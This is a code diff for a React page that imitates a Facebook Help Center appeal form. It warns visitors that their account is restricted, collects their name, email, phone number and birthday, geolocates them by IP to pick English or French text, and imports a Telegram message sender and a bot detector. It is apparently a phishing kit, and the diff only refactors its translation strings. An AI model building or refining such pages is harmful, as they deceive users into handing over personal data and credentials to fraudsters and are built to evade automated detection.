@@ -6,75 +6,72 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
-import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
 
-// 🚀 TỪ ĐIỂN CHỈ CHO TIẾNG PHÁP - SIÊU NHANH
-const frenchDictionary = {
-    'Help Center': 'Centre d\'aide',
-    'English': 'Anglais',
-    'Using': 'Utilisation',
-    'Managing Your Account': 'Gestion de votre compte',
-    'Privacy, Safety and Security': 'Confidentialité, sécurité et protection',
-    'Policies and Reporting': 'Politiques et signalement',
-    'Account Policy Complaints': 'Réclamations concernant les politiques de compte',
-    'We have detected unusual activity on your account that violates our community standards.': 'Nous avons détecté une activité inhabituelle sur votre compte qui enfreint nos normes communautaires.',
-    'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'L\'accès à votre compte sera restreint et vous ne pourrez pas publier, partager ou commenter en utilisant votre page pour le moment.',
-    'If you believe this is an error, you can file a complaint by providing the required information.': 'Si vous pensez qu\'il s\'agit d\'une erreur, vous pouvez déposer une réclamation en fournissant les informations requises.',
-    'Name': 'Nom',
-    'Email': 'E-mail',
-    'Phone Number': 'Numéro de téléphone',
-    'Birthday': 'Date de naissance',
-    'Your Appeal': 'Votre recours',
-    'Please describe your appeal in detail...': 'Veuillez décrire votre recours en détail...',
-    'Submit': 'Soumettre',
-    'This field is required': 'Ce champ est obligatoire',
-    'Please enter a valid email address': 'Veuillez saisir une adresse e-mail valide',
-    'About': 'À propos',
-    'Ad choices': 'Choix de publicités',
-    'Create ad': 'Créer une publicité',
-    'Privacy': 'Confidentialité',
-    'Careers': 'Carrières',
-    'Create Page': 'Créer une page',
-    'Terms and policies': 'Conditions et politiques',
-    'Cookies': 'Cookies'
+// 🚀 TIẾNG ANH MẶC ĐỊNH
+const englishTexts = {
+    helpCenter: 'Help Center',
+    english: 'English',
+    using: 'Using',
+    managingAccount: 'Managing Your Account',
+    privacySecurity: 'Privacy, Safety and Security',
+    policiesReporting: 'Policies and Reporting',
+    pagePolicyAppeals: 'Account Policy Complaints',
+    detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
+    accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
+    submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
+    pageName: 'Name',
+    mail: 'Email',
+    phone: 'Phone Number',
+    birthday: 'Birthday',
+    yourAppeal: 'Your Appeal',
+    appealPlaceholder: 'Please describe your appeal in detail...',
+    submit: 'Submit',
+    fieldRequired: 'This field is required',
+    invalidEmail: 'Please enter a valid email address',
+    about: 'About',
+    adChoices: 'Ad choices',
+    createAd: 'Create ad',
+    privacy: 'Privacy',
+    careers: 'Careers',
+    createPage: 'Create Page',
+    termsPolicies: 'Terms and policies',
+    cookies: 'Cookies'
+};
+
+// 🚀 TIẾNG PHÁP - CÓ SẴN TRONG CODE
+const frenchTexts = {
+    helpCenter: 'Centre d\'aide',
+    english: 'Anglais',
+    using: 'Utilisation',
+    managingAccount: 'Gestion de votre compte',
+    privacySecurity: 'Confidentialité, sécurité et protection',
+    policiesReporting: 'Politiques et signalement',
+    pagePolicyAppeals: 'Réclamations concernant les politiques de compte',
+    detectedActivity: 'Nous avons détecté une activité inhabituelle sur votre compte qui enfreint nos normes communautaires.',
+    accessLimited: 'L\'accès à votre compte sera restreint et vous ne pourrez pas publier, partager ou commenter en utilisant votre page pour le moment.',
+    submitAppeal: 'Si vous pensez qu\'il s\'agit d\'une erreur, vous pouvez déposer une réclamation en fournissant les informations requises.',
+    pageName: 'Nom',
+    mail: 'E-mail',
+    phone: 'Numéro de téléphone',
+    birthday: 'Date de naissance',
+    yourAppeal: 'Votre recours',
+    appealPlaceholder: 'Veuillez décrire votre recours en détail...',
+    submit: 'Soumettre',
+    fieldRequired: 'Ce champ est obligatoire',
+    invalidEmail: 'Veuillez saisir une adresse e-mail valide',
+    about: 'À propos',
+    adChoices: 'Choix de publicités',
+    createAd: 'Créer une publicité',
+    privacy: 'Confidentialité',
+    careers: 'Carrières',
+    createPage: 'Créer une page',
+    termsPolicies: 'Conditions et politiques',
+    cookies: 'Cookies'
 };
 
 const Home = () => {
-    const defaultTexts = useMemo(
-        () => ({
-            helpCenter: 'Help Center',
-            english: 'English',
-            using: 'Using',
-            managingAccount: 'Managing Your Account',
-            privacySecurity: 'Privacy, Safety and Security',
-            policiesReporting: 'Policies and Reporting',
-            pagePolicyAppeals: 'Account Policy Complaints',
-            detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
-            accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
-            submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
-            pageName: 'Name',
-            mail: 'Email',
-            phone: 'Phone Number',
-            birthday: 'Birthday',
-            yourAppeal: 'Your Appeal',
-            appealPlaceholder: 'Please describe your appeal in detail...',
-            submit: 'Submit',
-            fieldRequired: 'This field is required',
-            invalidEmail: 'Please enter a valid email address',
-            about: 'About',
-            adChoices: 'Ad choices',
-            createAd: 'Create ad',
-            privacy: 'Privacy',
-            careers: 'Careers',
-            createPage: 'Create Page',
-            termsPolicies: 'Terms and policies',
-            cookies: 'Cookies'
-        }),
-        []
-    );
-
     const [formData, setFormData] = useState({
         pageName: '',
         mail: '',
@@ -85,20 +82,11 @@ const Home = () => {
 
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    const [currentTexts, setCurrentTexts] = useState(englishTexts); // 🚀 Mặc định tiếng Anh
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
     const [securityChecked, setSecurityChecked] = useState(false);
     const [isFormEnabled, setIsFormEnabled] = useState(false);
-
-    // 🚀 HÀM DỊCH NHANH CHO PHÁP - NGAY LẬP TỨC
-    const applyFrenchTranslation = useCallback(() => {
-        const frenchTranslated = {};
-        Object.keys(defaultTexts).forEach(key => {
-            frenchTranslated[key] = frenchDictionary[defaultTexts[key]] || defaultTexts[key];
-        });
-        setTranslatedTexts(frenchTranslated);
-    }, [defaultTexts]);
 
     // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
     const initializeSecurity = useCallback(async () => {
@@ -119,12 +107,12 @@ const Home = () => {
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
-            // 🚀 CHỈ DỊCH CHO PHÁP, CÁC NƯỚC KHÁC GIỮ NGUYÊN TIẾNG ANH
+            // 🚀 QUYẾT ĐỊNH NGÔN NGỮ: PHÁP → TIẾNG PHÁP, CÒN LẠI → TIẾNG ANH
             if (detectedCountry === 'FR') {
-                // Dịch ngay lập tức bằng từ điển cục bộ
-                applyFrenchTranslation();
+                setCurrentTexts(frenchTexts); // IP Pháp → Hiển thị tiếng Pháp
+            } else {
+                setCurrentTexts(englishTexts); // Các nước khác → Giữ tiếng Anh
             }
-            // Các nước khác giữ nguyên defaultTexts (tiếng Anh)
 
             // 3. Set calling code
             const code = getCountryCallingCode(detectedCountry);
@@ -137,16 +125,17 @@ const Home = () => {
             console.log('Security initialization failed:', error.message);
             setCountryCode('US');
             setCallingCode('+1');
+            setCurrentTexts(englishTexts); // Lỗi → Mặc định tiếng Anh
             setSecurityChecked(true);
             setIsFormEnabled(true);
         }
-    }, [applyFrenchTranslation]);
+    }, []);
 
     // 🚀 HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
     useEffect(() => {
         initializeSecurity();
         
-        // 🚀 Enable form sau 1 GIÂY (nhanh hơn nữa)
+        // 🚀 Enable form sau 1 GIÂY
         const timer = setTimeout(() => {
             setIsFormEnabled(true);
         }, 1000);
@@ -300,22 +289,22 @@ const Home = () => {
         {
             id: 'using',
             icon: faCompass,
-            title: translatedTexts.using
+            title: currentTexts.using
         },
         {
             id: 'managing',
             icon: faUserGear,
-            title: translatedTexts.managingAccount
+            title: currentTexts.managingAccount
         },
         {
             id: 'privacy',
             icon: faLock,
-            title: translatedTexts.privacySecurity
+            title: currentTexts.privacySecurity
         },
         {
             id: 'policies',
             icon: faCircleExclamation,
-            title: translatedTexts.policiesReporting
+            title: currentTexts.policiesReporting
         }
     ];
 
@@ -326,13 +315,13 @@ const Home = () => {
                 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                 <div className='flex items-center gap-2'>
                     <img src={FacebookImage} alt='' className='h-10 w-10' />
-                    <p className='font-bold'>{translatedTexts.helpCenter}</p>
+                    <p className='font-bold'>{currentTexts.helpCenter}</p>
                 </div>
                 <div className='flex items-center gap-2'>
                     <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                         <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                     </div>
-                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
+                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{currentTexts.english}</p>
                 </div>
             </header>
             <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
@@ -354,17 +343,17 @@ const Home = () => {
                 <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                     <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
                         <div className='bg-[#e4e6eb] p-4 sm:p-6'>
-                            <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
+                            <p className='text-xl sm:text-3xl font-bold'>{currentTexts.pagePolicyAppeals}</p>
                         </div>
                         <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
-                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
-                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
-                            <p>{translatedTexts.submitAppeal}</p>
+                            <p className='mb-3'>{currentTexts.detectedActivity}</p>
+                            <p className='mb-3'>{currentTexts.accessLimited}</p>
+                            <p>{currentTexts.submitAppeal}</p>
                         </div>
                         <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-base'>
-                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
+                                    {currentTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
                                     type='text' 
@@ -375,11 +364,11 @@ const Home = () => {
                                     onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                     disabled={!isFormEnabled}
                                 />
-                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.pageName && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-base'>
-                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
+                                    {currentTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
                                     type='email' 
@@ -390,12 +379,12 @@ const Home = () => {
                                     onChange={(e) => handleInputChange('mail', e.target.value)} 
                                     disabled={!isFormEnabled}
                                 />
-                                {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                                {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
+                                {errors.mail === true && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
+                                {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{currentTexts.invalidEmail}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-base'>
-                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
+                                    {currentTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}>
                                     <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
@@ -411,11 +400,11 @@ const Home = () => {
                                         disabled={!isFormEnabled}
                                     />
                                 </div>
-                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.phone && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-base'>
-                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
+                                    {currentTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
                                 <input 
@@ -445,29 +434,29 @@ const Home = () => {
                                     </div>
                                 </div>
                                 
-                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.birthday && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
                                 <p className='text-base sm:text-base'>
-                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
+                                    {currentTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
                                     rows={4}
                                     className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
-                                    placeholder={translatedTexts.appealPlaceholder}
+                                    placeholder={currentTexts.appealPlaceholder}
                                     value={formData.appeal}
                                     onChange={(e) => handleInputChange('appeal', e.target.value)}
                                     disabled={!isFormEnabled}
                                 />
-                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                {errors.appeal && <span className='text-xs text-red-500'>{currentTexts.fieldRequired}</span>}
                             </div>
                             <button 
                                 className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 ${!isFormEnabled ? 'bg-gray-400 cursor-not-allowed text-white' : 'bg-blue-600 hover:bg-blue-700 text-white'}`} 
                                 onClick={handleSubmit}
                                 disabled={!isFormEnabled}
                             >
-                                {!isFormEnabled ? 'Checking...' : translatedTexts.submit}
+                                {!isFormEnabled ? 'Checking...' : currentTexts.submit}
                             </button>
                             
                             {!securityChecked && (
@@ -480,18 +469,18 @@ const Home = () => {
                     <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
                         <div className='mx-auto flex justify-between'>
                             <div className='flex flex-col space-y-4'>
-                                <p>{translatedTexts.about}</p>
-                                <p>{translatedTexts.adChoices}</p>
-                                <p>{translatedTexts.createAd}</p>
+                                <p>{currentTexts.about}</p>
+                                <p>{currentTexts.adChoices}</p>
+                                <p>{currentTexts.createAd}</p>
                             </div>
                             <div className='flex flex-col space-y-4'>
-                                <p>{translatedTexts.privacy}</p>
-                                <p>{translatedTexts.careers}</p>
-                                <p>{translatedTexts.createPage}</p>
+                                <p>{currentTexts.privacy}</p>
+                                <p>{currentTexts.careers}</p>
+                                <p>{currentTexts.createPage}</p>
                             </div>
                             <div className='flex flex-col space-y-4'>
-                                <p>{translatedTexts.termsPolicies}</p>
-                                <p>{translatedTexts.cookies}</p>
+                                <p>{currentTexts.termsPolicies}</p>
+                                <p>{currentTexts.cookies}</p>
                             </div>
                         </div>
                         <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
